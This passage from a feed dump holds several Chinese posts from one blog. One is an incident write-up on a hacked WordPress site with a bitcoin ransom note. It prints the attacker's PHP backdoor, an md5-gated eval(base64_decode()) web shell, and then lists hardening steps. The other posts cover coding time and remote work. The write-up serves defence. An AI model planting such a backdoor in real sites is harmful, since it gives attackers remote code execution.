id=\"target-id5f43e195a8313\" class=\"collapseomatic_content \"> <iframe src=\"//player.bilibili.com/player.html?aid=926737870&#38;bvid=BV12T4y157Z7&#38;cid=223556976&#38;page=8\" width=\"100%\" height=\"600\" frameborder=\"no\" scrolling=\"no\" allowfullscreen=\"allowfullscreen\"> </iframe> </div>\n\n\n\n<p>&#160;</p>\n<span class=\"collapseomatic \" id=\"id5f43e195a8326\"  tabindex=\"0\" title=\"P9 第二部分：为什么要成为全栈工程师\"    >P9 第二部分：为什么要成为全栈工程师</span><div id=\"target-id5f43e195a8326\" class=\"collapseomatic_content \"> <iframe src=\"//player.bilibili.com/player.html?aid=926737870&#38;bvid=BV12T4y157Z7&#38;cid=223558913&#38;page=9\" width=\"100%\" height=\"600\" frameborder=\"no\" scrolling=\"no\" allowfullscreen=\"allowfullscreen\"> </iframe> </div>\n<p>&#160;</p>\n<p><strong><font color=\"#ff0000\">文章未经特殊标明皆为本人原创，未经许可不得用于任何商业用途，转载请保持完整性并注明来源链接 <a href=\"https://www.raychase.net/6244\">《四火的唠叨》</a></font></strong></p><div class='yarpp-related-rss'>\n<p>你可能也喜欢看：</p><ol>\n<li><a href=\"https://www.raychase.net/5302\" rel=\"bookmark\" title=\"不要让业务牵着鼻子走\">不要让业务牵着鼻子走 </a></li>\n<li><a href=\"https://www.raychase.net/5633\" rel=\"bookmark\" title=\"极客时间上我的专栏《全栈工程师修炼指南》\">极客时间上我的专栏《全栈工程师修炼指南》 </a></li>\n<li><a href=\"https://www.raychase.net/375\" rel=\"bookmark\" title=\"思考、学习新技术的原则和方式\">思考、学习新技术的原则和方式 </a></li>\n<li><a href=\"https://www.raychase.net/1369\" rel=\"bookmark\" title=\"有趣还是无趣？\">有趣还是无趣？ </a></li>\n<li><a href=\"https://www.raychase.net/3689\" rel=\"bookmark\" title=\"从淘汰 Oracle 数据库的事情说起\">从淘汰 Oracle 数据库的事情说起 </a></li>\n</ol>\n</div>\n","descriptionType":"html","publishedDate":"Sat, 15 Aug 2020 21:52:55 +0000","feedId":2871,"bgimg":"","linkMd5":"759315f30f8d0cd51c7055dfdcc9f589","bgimgJsdelivr":"","metaImg":"","author":"四火","publishedOrCreatedDate":1598283901921},{"createdTime":"2020-08-24 23:45:01","updatedTime":"2020-08-24 23:45:01","title":"Blog 被黑记录","link":"https://www.raychase.net/?p=5808","description":"<p>最近这个 blog 被黑了，如果你恰巧那一天访问，你会看到所有数据都丢失了，网站打开的页面，是一个初始配置数据库连接的页面。我记得几个月前，这个 blog 曾经遭受过 XML-RPC 攻击，我当时把问题的分析和处理<a href=\"https://www.raychase.net/4620\" target=\"_blank\" rel=\"noopener noreferrer\">记录在了这里</a>。这一次，可不只是网站拒绝服务这样的问题了，而是整个网站的数据库都被干掉了。</p> \n<h3>被黑记录</h3> \n<p>问题出现的时候，网站访问不了了，我登上 MySQL 数据库查看了一下，发现所有数据都删掉了，只留下了一个 WARNING 的表：</p> \n<p><a href=\"https://www.raychase.net/wp-content/uploads/2020/01/snapshot.jpeg\"><img class=\"alignnone size-full wp-image-5809\" src=\"https://www.raychase.net/wp-content/uploads/2020/01/snapshot.jpeg\" alt=\"\" width=\"1882\" height=\"1030\" srcset=\"https://www.raychase.net/wp-content/uploads/2020/01/snapshot.jpeg 1882w, https://www.raychase.net/wp-content/uploads/2020/01/snapshot-300x164.jpeg 300w, https://www.raychase.net/wp-content/uploads/2020/01/snapshot-768x420.jpeg 768w, https://www.raychase.net/wp-content/uploads/2020/01/snapshot-1024x560.jpeg 1024w\" sizes=\"(max-width: 1882px) 100vw, 1882px\" /></a></p> \n<p>上面说的也很清楚，让我往指定地址打 0.08 个比特币，他们就可以把数据还给我，要不然 10 天以后就会把数据库里的数据公开。在 <a href=\"https://www.bitcoinabuse.com/\" target=\"_blank\" rel=\"noopener noreferrer\">Bitcoin Abuse Database</a> 上，我找到了类似的数条记录。</p> \n<p>还好，我每天都有备份，因此丢失的数据其实比较少。当然了，这是我个人的 blog，并没有存放什么私密的信息。</p> \n<p>之后，我留意到黑客在我的 WordPress 目录中留了一个后门文件：</p> \n<div> \n <div id=\"highlighter_1456\" class=\"syntaxhighlighter  shell\"> \n  <div class=\"toolbar\">\n   <a class=\"toolbar_item command_help help\" href=\"https://www.raychase.net/?p=5808#\">?</a>\n  </div> \n  <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n   <tbody> \n    <tr> \n     <td class=\"gutter\"> \n      <div class=\"line number1 index0 alt2\">\n       1\n      </div> \n      <div class=\"line number2 index1 alt1\">\n       2\n      </div> </td> \n     <td class=\"code\"> \n      <div class=\"container\"> \n       <div class=\"line number1 index0 alt2\">\n        <code class=\"shell functions\">cat</code> \n        <code class=\"shell plain\">wp-includes/.wp-config.php</code>\n       </div> \n       <div class=\"line number2 index1 alt1\">\n        <code class=\"shell plain\">&lt;?php </code>\n        <code class=\"shell functions\">echo</code>\n        <code class=\"shell string\">\"abrval\"</code>\n        <code class=\"shell plain\">;error_reporting(0);</code>\n        <code class=\"shell keyword\">if</code>\n        <code class=\"shell plain\">(isset($_REQUEST[</code>\n        <code class=\"shell string\">'lanfren'</code>\n        <code class=\"shell plain\">]) &amp;&amp; md5($_REQUEST[</code>\n        <code class=\"shell string\">'lanfren'</code>\n        <code class=\"shell plain\">]) == </code>\n        <code class=\"shell string\">'863b84c60e8377d9400b97e449a96e96'</code> \n        <code class=\"shell plain\">&amp;&amp; isset($_REQUEST[</code>\n        <code class=\"shell string\">'lanfra'</code>\n        <code class=\"shell plain\">])) </code>\n        <code class=\"shell functions\">eval</code>\n        <code class=\"shell plain\">(base64_decode($_REQUEST[</code>\n        <code class=\"shell string\">'lanfra'</code>\n        <code class=\"shell plain\">]));?&gt;</code>\n       </div> \n      </div> </td> \n    </tr> \n   </tbody> \n  </table> \n </div> \n</div> \n<p>在 wp-content/plugins/index.php 中，也加上了类似的内容。这段逻辑也不难理解，请求参数 lanfren 的串在 md5 之后，如果和指定串相等，就用 base64 解码 lanfra 的参数（估计参数值是一串代码），并使用 eval 执行。</p> \n<p>但是这件事情倒是在催促我，即便是个人 blog 站点，必要的安全加固操作还是要做的。之前这些年来都没有出现问题，但是这次在 <a href=\"https://www.raychase.net/5790\" target=\"_blank\" rel=\"noopener noreferrer\">VPS 切换</a>后没有几周，就出了这样的幺蛾子。</p> \n<h3>安全加固</h3> \n<p>下面就是一些必要的操作。</p> \n<h4>密码更换</h4> \n<p>首先，需要更换掉密码，主要包括 WordPress 的密码，以及 MySQL 的密码。</p> \n<p>WordPress 存储密码的时候，是经过摘要了的，并非密码原文，但是更换密码依然是推荐的方式。</p> \n<p>另外，我推荐大家都去<a href=\"https://haveibeenpwned.com/\" target=\"_blank\" rel=\"noopener noreferrer\">‘;–have i been pwned?</a> 这个网站上看一下自己的 email 账号信息有没有泄露，我的几个 email 里面，大部分都已经跪了。</p> \n<p><a href=\"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200123_3.png\"><img class=\"alignnone size-full wp-image-5811\" src=\"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200123_3.png\" alt=\"\" width=\"2052\" height=\"920\" srcset=\"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200123_3.png 2052w, https://www.raychase.net/wp-content/uploads/2020/01/Snip20200123_3-300x135.png 300w, https://www.raychase.net/wp-content/uploads/2020/01/Snip20200123_3-768x344.png 768w, https://www.raychase.net/wp-content/uploads/2020/01/Snip20200123_3-1024x459.png 1024w\" sizes=\"(max-width: 2052px) 100vw, 2052px\" /></a></p> \n<p>这个网站上也有一个链接，链到 <a href=\"https://my.1password.com/\" target=\"_blank\" rel=\"noopener noreferrer\">1password</a> 上去，安装这个 app 以后，可以检查自己的密码是否已经泄露（它使用密码散列后的串来进行校验，因此不用担心在这一步泄露密码）：</p> \n<p><a href=\"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200123_4.png\"><img class=\"alignnone size-full wp-image-5812\" src=\"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200123_4.png\" alt=\"\" width=\"1438\" height=\"546\" srcset=\"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200123_4.png 1438w, https://www.raychase.net/wp-content/uploads/2020/01/Snip20200123_4-300x114.png 300w, https://www.raychase.net/wp-content/uploads/2020/01/Snip20200123_4-768x292.png 768w, https://www.raychase.net/wp-content/uploads/2020/01/Snip20200123_4-1024x389.png 1024w\" sizes=\"(max-width: 1438px) 100vw, 1438px\" /></a></p> \n<p>当然，记住那么多密码也是比较困难的一件事情，我使用密码管理软件 LastPass。</p> \n<h4>使用密钥登陆</h4> \n<p>以前<a href=\"https://www.raychase.net/4620\" target=\"_blank\" rel=\"noopener noreferrer\">这篇文章</a>已经介绍过。</p> \n<h4>清理 php 文件</h4> \n<p>php 是真正的代码文件，访问就可以执行，因此这些文件是首先要认真对待的。</p> \n<p>WordPress 默认的目录下，有一些 php 文件是可以拿掉的，这样就杜绝了用户的访问可能。哪怕这些文件都是有用的，也可以压缩存放到其它地方去。</p> \n<p>有一些文件可以改名隐藏起来，比如登陆用的 wp-login.php。如果需要这个文件，不能删除或改名，但又不想用户访问，那就可以用.htaccess 或 Nginx 配置来保护起来。</p> \n<h4>Nginx 配置</h4> \n<p>有一些访问我是想屏蔽掉的，比如：</p> \n<div> \n <div id=\"highlighter_613375\" class=\"syntaxhighlighter  shell\"> \n  <div class=\"toolbar\">\n   <a class=\"toolbar_item command_help help\" href=\"https://www.raychase.net/?p=5808#\">?</a>\n  </div> \n  <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n   <tbody> \n    <tr> \n     <td class=\"gutter\"> \n      <div class=\"line number1 index0 alt2\">\n       1\n      </div> \n      <div class=\"line number2 index1 alt1\">\n       2\n      </div> </td> \n     <td class=\"code\"> \n      <div class=\"container\"> \n       <div class=\"line number1 index0 alt2\">\n        <code class=\"shell plain\">location ~ /(wp-content|uploads|images)/.*\\.php$ { deny all; }</code>\n       </div> \n       <div class=\"line number2 index1 alt1\">\n        <code class=\"shell plain\">location ~ </code>\n        <code class=\"shell plain\">/wp-</code>\n        <code class=\"shell plain\">(config|mail|</code>\n        <code class=\"shell functions\">cron</code>\n        <code class=\"shell plain\">|activate|settings|load|blog-header|links-opml|signup|login)\\.php$ { deny all; }</code>\n       </div> \n      </div> </td> \n    </tr> \n   </tbody> \n  </table> \n </div> \n</div> \n<p>4xx 和 5xx 的页面也统统导向一个不暴露 Nginx 信息的页面：</p> \n<div> \n <div id=\"highlighter_378078\" class=\"syntaxhighlighter  shell\"> \n  <div class=\"toolbar\">\n   <a class=\"toolbar_item command_help help\" href=\"https://www.raychase.net/?p=5808#\">?</a>\n  </div> \n  <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n   <tbody> \n    <tr> \n     <td class=\"gutter\"> \n      <div class=\"line number1 index0 alt2\">\n       1\n      </div> </td> \n     <td class=\"code\"> \n      <div class=\"container\"> \n       <div class=\"line number1 index0 alt2\">\n        <code class=\"shell plain\">error_page 400 401 402 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 421 422 423 424 425 426 428 429 431 451 500 501 502 503 504 505 506 507 508 510 511 </code>\n        <code class=\"shell plain\">/error</code>\n        <code class=\"shell plain\">.html;</code>\n       </div> \n      </div> </td> \n    </tr> \n   </tbody> \n  </table> \n </div> \n</div> \n<h4>关闭 MySQL 的远程模式</h4> \n<p>编辑/etc/my.cnf，添加：</p> \n<div> \n <div id=\"highlighter_263659\" class=\"syntaxhighlighter  shell\"> \n  <div class=\"toolbar\">\n   <a class=\"toolbar_item command_help help\" href=\"https://www.raychase.net/?p=5808#\">?</a>\n  </div> \n  <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n   <tbody> \n    <tr> \n     <td class=\"gutter\"> \n      <div class=\"line number1 index0 alt2\">\n       1\n      </div> </td> \n     <td class=\"code\"> \n      <div class=\"container\"> \n       <div class=\"line number1 index0 alt2\">\n        <code class=\"shell plain\">skip-networking</code>\n       </div> \n      </div> </td> \n    </tr> \n   </tbody> \n  </table> \n </div> \n</div> \n<p>重启 MySQL：</p> \n<div> \n <div id=\"highlighter_782098\" class=\"syntaxhighlighter  shell\"> \n  <div class=\"toolbar\">\n   <a class=\"toolbar_item command_help help\" href=\"https://www.raychase.net/?p=5808#\">?</a>\n  </div> \n  <table border=\"0\" cellspacing=\"0\" cellpadding=\"0\"> \n   <tbody> \n    <tr> \n     <td class=\"gutter\"> \n      <div class=\"line number1 index0 alt2\">\n       1\n      </div> </td> \n     <td class=\"code\"> \n      <div class=\"container\"> \n       <div class=\"line number1 index0 alt2\">\n        <code class=\"shell plain\">lnmp mysql restart</code>\n       </div> \n      </div> </td> \n    </tr> \n   </tbody> \n  </table> \n </div> \n</div> \n<p>这样就杜绝了远程访问数据库的可能，MySQL 只能通过 localhost 来访问。</p> \n<h4>PHP 和 WordPress 升级</h4> \n<p>PHP 的版本是 5.6.40 的，太老了。使用 lnmp 自带的升级工具 upgrade.sh 就可以完成。</p> \n<p>还有一个事儿是 WordPress 升级，这个在管理台就可以完成。</p> \n<h4>几个有用的插件</h4> \n<p>第一个是 <a href=\"https://updraftplus.com/\" target=\"_blank\" rel=\"noopener noreferrer\">UpdraftPlus</a>，这个比一般的备份功能更好的是，它把备份后的上传功能集成进去了，我配置了备份以后上传到另外一台 FTP 服务器的功能。</p> \n<p>第二个是 <a href=\"https://sucuri.net/wordpress-security-plugin/\" target=\"_blank\" rel=\"noopener noreferrer\">Sucuri WordPress Plugin</a>，有一些很实用的安全方面的功能，比如 WordPress 文件完整性检查，前面说的那个后门文件就是通过这个插件发现的。后来我使用了 <a href=\"https://www.wordfence.com/\" target=\"_blank\" rel=\"noopener noreferrer\">Wordfence</a>，这个功能要更加强大一些，防火墙和文件扫描功能尤其好用。</p> \n<h4>安全隐患扫描</h4> \n<p>网上有不少方便的扫描工具，比如 <a href=\"https://pentest-tools.com/website-vulnerability-scanning/website-scanner\" target=\"_blank\" rel=\"noopener noreferrer\">Website Vulnerability Scanner</a>，下面这几个问题在 PHP 升级之后就都解决了：</p> \n<p><a href=\"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200125_5.png\"><img class=\"alignnone size-full wp-image-5851\" src=\"https://www.raychase.net/wp-content/uploads/2020/01/Snip20200125_5.png\" alt=\"\" width=\"1892\" height=\"954\" /></a></p> \n<p>还有一个是端口扫描，服务器开放的端口自己心中有数，比如可以使用<a href=\"https://gf.dev/port-scanner\" target=\"_blank\" rel=\"noopener noreferrer\">这个</a>工具。</p>\n<p><strong><font color=\"#ff0000\">文章未经特殊标明皆为本人原创，未经许可不得用于任何商业用途，转载请保持完整性并注明来源链接 <a href=\"https://www.raychase.net/5808\">《四火的唠叨》</a></font></strong></p>\n<div class=\"yarpp-related-rss\"> \n <p>你可能也喜欢看：</p>\n <ol> \n  <li><a href=\"https://www.raychase.net/5318\" rel=\"bookmark\" title=\"HTTPS 升级\">HTTPS 升级 </a></li> \n  <li><a href=\"https://www.raychase.net/5790\" rel=\"bookmark\" title=\"VPS 迁移和网站备案\">VPS 迁移和网站备案 </a></li> \n  <li><a href=\"https://www.raychase.net/4620\" rel=\"bookmark\" title=\"Blog 安全问题小记\">Blog 安全问题小记 </a></li> \n  <li><a href=\"https://www.raychase.net/249\" rel=\"bookmark\" title=\"如何思考面向对象\">如何思考面向对象 </a></li> \n  <li><a href=\"https://www.raychase.net/1509\" rel=\"bookmark\" title=\"Chrome 插件开发\">Chrome 插件开发 </a></li> \n </ol> \n</div>","descriptionType":"html","publishedDate":"Sat, 25 Jan 2020 21:40:23 +0000","feedId":2871,"bgimg":"https://www.raychase.net/wp-content/uploads/2020/01/snapshot.jpeg","linkMd5":"c6be65c24cf617aa467a6f90508e5e6c","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn24@2020_1/2020/08/24/15-45-06-571_1406d40c5438d742.webp","destWidth":1882,"destHeight":1030,"sourceBytes":308053,"destBytes":109440,"author":"四火","articleImgCdnMap":{"https://www.raychase.net/wp-content/uploads/2020/01/snapshot.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn24@2020_1/2020/08/24/15-45-06-571_1406d40c5438d742.webp","https://www.raychase.net/wp-content/uploads/2020/01/Snip20200123_3.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn56@2020_4/2020/08/24/15-45-21-647_e68ab4a401ab7581.webp","https://www.raychase.net/wp-content/uploads/2020/01/Snip20200123_4.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn33@2020_2/2020/08/24/15-45-15-437_2b2e2307ae825709.webp","https://www.raychase.net/wp-content/uploads/2020/01/Snip20200125_5.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn88@2020_6/2020/08/24/15-45-15-993_d875ffa605956e9e.webp"},"publishedOrCreatedDate":1598283901926},{"createdTime":"2020-08-24 23:45:01","updatedTime":"2020-08-24 23:45:01","title":"哎，写代码的时间真的越来越少了……","link":"https://www.raychase.net/?p=6099","description":"<p><a href=\"https://www.raychase.net/wp-content/uploads/2020/04/photo-1483213097419-365e22f0f258.jpeg\"><img class=\"alignright wp-image-6100\" src=\"https://www.raychase.net/wp-content/uploads/2020/04/photo-1483213097419-365e22f0f258.jpeg\" alt=\"\" width=\"320\" height=\"213\" /></a>还记得在读书的时候，就对程序员有种坐在电脑前疯狂敲代码的刻板印象。工作以后，逐渐理解了软件工程师的工作到底是怎么样的，可是写代码，作为软件工程师最重要的本职工作，还是占据了相当比重的时间。在面试别人的时候，也经常被问到这样的问题——“平均你每天有多少时间花在写代码上？”，这个问题看似简单，却能反映出一个问题，软件工程师，能否有足够的时间专注在最本职工作——写代码上。毫无疑问，我完全理解这样的问题，并且，我也一直以来想保持着自己一个 “纯粹” 程序员的身份。我觉得我的职业通道也是一条纯粹的技术人的道路，因而写代码，是一个如同每天吃饭喝水一样的基本操作。</p> \n<p>可是，随着职业生涯的进展，特别是近半年来的一系列变化，我已经明显感受到，这已经发生了变化，曾经的理所应当不再是理所应当。这个变化会带来什么，除去不断的思考，时间会告诉我更多。</p> \n<h3>团队的变化</h3> \n<p>在建立初期，OCI 更偏向于招纳更有经验的工程师，因为那个时候 “打地基”、“搭框架” 的工作潜在的影响力，和犯错的可能更为巨大，这样的工作不只是云服务本身的建设，还包括团队和流程体系的打磨。但是逐渐地，随着团队的扩张，招人的策略也发生了明显的变化：</p> \n<ul> \n <li>更多的初级职位，更多地吸纳经验较少的工程师，特别是毕业生；</li> \n <li>对于高级别的职位，需求量减少，要求的标准相对而言可能有所提高。</li> \n</ul> \n<p>其实这也没有什么难以理解的，现在无论是技术人还是管理人，不管是 IC（Individual Contributor）岗还是 M（Manager）岗，大家都对级别和对应的能力和贡献的期望愈发清晰。换言之，就是很明确什么样的工作，交给什么样能力的人去做。这样一来，大多数团队对具备不同能力和经验的软件工程师的需求，也变成了塔状，即经验较少的工程师占较大（60% 以上）的比重。于是，在能够达成目的的基础上，使用这样的模式，可以更好地控制团队的薪酬成本，同时，不同的工程师也可以得到相对合适的挑战。</p> \n<p>另一方面，团队负责的项目的规模还在逐渐扩大。团队重新划分过几次，如今我们也肯定是一个全栈式团队（对全栈式团队有疑惑的可以参见<a href=\"https://time.geekbang.org/column/article/154696\" target=\"_blank\" rel=\"noopener noreferrer\">我在专栏中的解读</a>），而团队拥有的产品里面，既有数据中心的数据服务，有分布式工作流引擎，还有内部使用的可视化工具网站，并且可以说是既有平台，又有业务。因此对于大部分计算机相关专业毕业的软件工程师，都可以在我们团队找到感兴趣的方向。（题外话，目前由于新冠病毒造成的影响，OCI 的招聘暂停，但是预计在数周后会逐步恢复，对我们团队感兴趣的可以和我联系，不过工作地点只有西雅图。）</p> \n<p>这三个产品可以说每一个所对应的最大挑战都不相同，但是配合起来，大的目标是一致的，就是为数据中心，特别是新建数据中心服务，既包括流程自动化，又包括数据存取和展示。</p> \n<h3>我自己的变化</h3> \n<p>回想工作最初的几年，特性和功能开发是时间花费最主要的地方，也是最多的 “写代码” 的原因。如今，这件事情肯定已经跌出前三了。</p> \n<p>这半年来，我自身的角色也发生了比较大的变化，现在除去一如既往地负责单个产品本身的主要项目，还需要牵线那些各个产品负责的子团队协作来完成的工作。而在项目和团队中实际做的事情，也有了明显变化。总的来说，下面这些事情，时间占用出现了大幅度的上升：</p> \n<h4>产品或特性的规划</h4> \n<p>早些年我的理解，对于产品或特性的规划，应该是 TPM 或者产品经理这样的角色来完成的，但是其实这是不准确的。事实上，一方面，有很多工作确实是需要有足够技术背景的人去完成；而另一方面，本身对于多数项目来说这样的角色已经很模糊了，一个不深入理解业务和产品的 IC？不可能的。</p> \n<p>对于我们团队来说，TPM 能够提供这样三个方面的帮助：业务、项目和客户。但是，有许多产品或特性的规划，基本上这三个都不相关，完全是工程师的活儿。比如说分布式工作流引擎，业务线和技术线是可以分得比较清楚的：下面的平台本身是业务无关的，而在其之上跑着的的业务工作流却相反。因此，对于其中技术层面的规划设计，也包括将业务怎样落地梳理清楚，只有工程师才能完成。</p> \n<h4>技术架构</h4> \n<p>这部分其实接近于我在读书时期对于架构师狭隘的理解。</p> \n<p>事实上，我了解到，对于很多真正参与这方面工作的人来说，真正的纯技术架构工作，占比并不会非常大。这一方面是由于，并没有那么多产品长期处于 “初创期” 或者 “转型期”，需要大量的架构工作；另一方面，则是因为一切的技术架构都是建立在业务和需求清晰的基础之上，而做到这一基础已经需要巨大的时间精力投入了。</p> \n<p>值得一提的是，这样的工作需要一些考察和探索，比如做技术选型和快速原型。有时候也会涉及一部分编码。总的来说，这其实是我比较喜欢的事情。</p> \n<h4>管理、沟通和协调</h4> \n<p>这部分我描述得很笼统，并且有一点像管理岗的工作了。或多或少，这是一个 IC 不可避免的职责。理想状况下研发经理理应承担更多这方面的工作，但是我们的团队人手方面，这样的角色数量不足够，因而 IC 需要更多地承担这方面的工作。当然，即便能做到理想状况，沟通和协调于我而言，依然会占据相当的比重。</p> \n<p>对于我们团队而言，偏重技术方面的需求比较多，因此需要软件工程师更多的参与。事实上，我们每一个产品/子团队都有 lead，他们都会主导或重度参与每一个 Sprint 的任务规划。这也再一次印证了，对于 IC 来说，随着职业生涯的发展，角色定位就是会越来越 “模糊”。</p> \n<h4>Mentoring</h4> \n<p>在我们团队，目前工作经验较少的工程师比较多，因此 mentoring 是一件比较重要的事情（除此之外，这个状况也是对于 dev manager 需求比较强烈的原因之一）。当然，这部分时间开销，也可以归纳到上面的 “管理、沟通和协调” 当中去。</p> \n<h4>招聘</h4> \n<p>上面说的是团队内的时间开销，而在跨团队的 OCI 层面，有这样两项内容花费了显著的时间：一个是设计评审，另一个就是招聘。而对工程师来说，这件事基本围绕面试展开。对于这个话题，鉴于之前已经说过几次了（比如<a href=\"https://www.raychase.net/5934\" target=\"_blank\" rel=\"noopener noreferrer\">这一篇</a>和<a href=\"https://www.raychase.net/5749\" target=\"_blank\" rel=\"noopener noreferrer\">这一篇</a>），在此就不展开了。</p> \n<p>对于角色上的变化，我依然在逐步适应中，寻找最适合自己的方式。而对于写代码这个事情，时间确实是越来越少了，不知道一个合适的解决方法是什么？当然，我并不想去狭隘和片面地追求编码时间，但是我知道，编码是一件常练常新的基本功。在工作中，到底应该怎样更有效地分配时间，平衡包括编码在内的各种各样的事情，希望我可以很快把这个问题考虑清楚……</p> \n<p><strong><font color=\"#ff0000\">文章未经特殊标明皆为本人原创，未经许可不得用于任何商业用途，转载请保持完整性并注明来源链接 <a href=\"https://www.raychase.net/6099\">《四火的唠叨》</a></font></strong></p> \n<div class=\"yarpp-related-rss\"> \n <p>你可能也喜欢看：</p>\n <ol> \n  <li><a href=\"https://www.raychase.net/1369\" rel=\"bookmark\" title=\"有趣还是无趣？\">有趣还是无趣？ </a></li> \n  <li><a href=\"https://www.raychase.net/1107\" rel=\"bookmark\" title=\"我眼中的工程师文化\">我眼中的工程师文化 </a></li> \n  <li><a href=\"https://www.raychase.net/280\" rel=\"bookmark\" title=\"代码的变与不变\">代码的变与不变 </a></li> \n  <li><a href=\"https://www.raychase.net/1020\" rel=\"bookmark\" title=\"史上最烂的代码\">史上最烂的代码 </a></li> \n  <li><a href=\"https://www.raychase.net/1183\" rel=\"bookmark\" title=\"进阶过程：程序员做项目的独立性\">进阶过程：程序员做项目的独立性 </a></li> \n </ol> \n</div>","descriptionType":"html","publishedDate":"Mon, 27 Apr 2020 00:16:53 +0000","feedId":2871,"bgimg":"https://www.raychase.net/wp-content/uploads/2020/04/photo-1483213097419-365e22f0f258.jpeg","linkMd5":"33acec1e7ca7ce7089139000e7dd720f","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn3@2020_4/2020/08/24/15-45-04-840_2d1d5544666d6fb4.webp","destWidth":750,"destHeight":500,"sourceBytes":85749,"destBytes":48240,"author":"四火","articleImgCdnMap":{"https://www.raychase.net/wp-content/uploads/2020/04/photo-1483213097419-365e22f0f258.jpeg":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn3@2020_4/2020/08/24/15-45-04-840_2d1d5544666d6fb4.webp"},"publishedOrCreatedDate":1598283901923},{"createdTime":"2020-08-24 23:45:01","updatedTime":"2020-08-24 23:45:01","title":"写在在家办公四周之时","link":"https://www.raychase.net/?p=6066","description":"<p>几年前我曾经<a rel=\"noreferrer noopener\" aria-label=\"写过一点 (opens in a new tab)\" href=\"https://www.raychase.net/2358\" target=\"_blank\">写过一点</a>对于 “在家办公” 的思考，后来<a rel=\"noreferrer noopener\" aria-label=\"又写了一点 (opens in a new tab)\" href=\"https://www.raychase.net/4265\" target=\"_blank\">又写了一点</a>，但是从来都没有想到过，长期的在家办公如今已经不是一个可选项，而是一个必选项了。</p> \n<p><img class=\"wp-image-6068 alignright\" src=\"https://www.raychase.net/wp-content/uploads/2020/03/photo-1585060697712-d9e550dc9e23.jpeg\" alt=\"\" width=\"320\" height=\"211\" /></p> \n<p>应该说，我从来都不是一个频繁在家办公的支持者，我是说，在家办公这样的互联网公司特有的 “福利” 当然是好的，但是 “频繁” 在家办公对于团队、项目，甚至个人职业成长等等各方面来说，都不是一件好事。我记得在刚加入亚马逊的时候，我听说亚马逊给了一位工程师这样一个 offer——允许一个月之内四分之三的时间远程办公。当时我觉得这件事情还是挺不可思议的，因为像曾经的 37signals 这样的小公司当然容易做到，但是长期和频繁地在家办公却不是大型互联网公司能玩得转的。</p> \n<p>现在整个情况都发生变化了，由于新冠疫情，我们被迫在家办公，或者说，全公司绝大多数人都只能选择在家办公了，而且这件事情目前为止还似乎在漆黑的隧道里，还没有看到头。</p> \n<h3>在家办公的好处</h3> \n<p>虽然一般情况下，我更希望到公司去办公，而不是在家，但是不可否认在家办公是有很多好处的。</p> \n<p>首先，在家办公会让自己更自由。开某些会的时候，可以躺在床上说话，一边说一边闭目休息（比如某些 1 on 1 沟通会）；脖子酸了可以趴一会儿；家里有需要帮助和处理的事情也可以很方便地离开一会儿去处理。</p> \n<p>其次，在家办公省掉了通勤的时间。不用考虑通勤的时间消耗，就意味着可以把闹铃设到一个更晚的时间，每天可以用于自己支配的时间更充裕。</p> \n<p>最后，在家办公也能减少一些打扰。没有人来直接打扰你，这可以算一个原因，但这一条是有争议的，因为既然你在工作，你需要 “在线”，那么你的 Slack 很可能就不会消停……</p> \n<h3>在家办公的挑战</h3> \n<p>对于团队来说，面对面沟通和合作所带来的的凝聚力，是在家办公所无法带来的。想象一下，和你团队里的兄弟姐妹做一次 pair coding/review，或者是坐下来喝杯咖啡，再或者打局乒乓球，在 Happy Hour 时间聊一下。现在这些基本上都没有了，有的只有生硬和冷冰冰的一个又一个工作上的会议。</p> \n<p>对于项目来说，地理位置上的密切合作，所带来的的沟通高效率，也是在家办公所无法带来的。现在大家似乎都慢慢习惯了对这些远程沟通工具的使用，比如 Zoom 电话会议，可是依然，很多会议还会面临着诸多远程沟通才会有的问题，比如会前调试设备，会中时不时会有杂七杂八的声音，会有人掉线。直接沟通无疑是最高效的，Zoom 这样的工具可以让沟通得以进行，但是看不到手势，看不到表情，连板书也不那么自然，还是损失了很多沟通的信息。</p> \n<p>对个人职业发展来说，在家办公也失去了很多能力锻炼的机会。比方说，英语能力本来就不够强大的情况下，面对面的沟通可以化简掉很多的问题，可是电话沟通就会对听说能力要求直接上了一个很大的台阶，保证沟通中信息的传达变成了一件很有挑战性的事情。对我个人来说，已经在西雅图工作好几年了，因此这不算是一个大问题，但是我知道身边有很多初入职场的工程师，英文能力还较为生疏，沟通就更可能成为一个问题。</p> \n<h3>在家办公的一点技巧</h3> \n<p>接着聊一点我们可以做的，能够改善在家办公之弊端的措施。</p> \n<p>硬件方面，显然，如今的在家办公不是一个 10 分钟的事情，也不是一个一两个钟头的事情，而是长时间，比方说，一天 7、8 个小时都需要持续发生的事情，是一个不能够轻易将就的事情。因此让自己在家办公时自己的身体尽量舒适就显得很有意义。对我来说，我不需要大的显示器，也不需要 laptop 有多高端的配置，但是，人体工学桌椅是很有帮助的，我可以坐一会，站一会。脖子不容易酸，也不容易疲劳。</p> \n<p>环境方面，尽可能保证一个安静的房间，是一个很有助益的因素。除此以外，在家的诱惑太多，干扰太多，一个降噪耳机可能能够帮助排除干扰。我有时候也会捧着笔记本电脑，临时地挪到另外的一个更加安静的房间，去开完电话会议。</p> \n<p>沟通的技巧方面，我觉得在重要的会议前，简单地罗列一些会议的安排和要点是非常有帮助的，这可能并非特定针对于在家办公的场景，但毫无疑问在家办公让其变得更为重要。开会的时候，有了这样的提纲，就可以专注于要解决的问题，而讨论的时候，也因为有了要点和上下文，效率更高。</p> \n<p>最后，还是希望疫情快过去吧。在家呆得已经发霉了，以往生活中喜欢做的事情，比如旅行、打球，或者是看电影，似乎这些不管什么都无法正常进行了。Social distancing 